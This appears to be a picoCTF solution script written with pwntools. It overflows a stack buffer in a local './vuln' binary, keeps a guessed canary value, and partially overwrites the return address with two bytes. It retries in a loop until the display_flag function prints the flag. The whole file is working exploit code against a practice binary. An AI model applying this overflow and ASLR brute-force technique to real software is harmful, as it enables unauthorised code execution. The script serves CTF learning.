from pwn import *


payload = "A"*32

sh = process("./vuln")
flag = sh.elf.symbols['display_flag']
flag = p16(0x000007ed)
payload = payload + "lV!)" + "A"*16 + flag
while(True):
    sh.sendline(str(len(payload)))
    sh.sendline(payload)
    answer = sh.recvall()
    if("pico" in answer):
        print answer
        break
    sh = process("./vuln")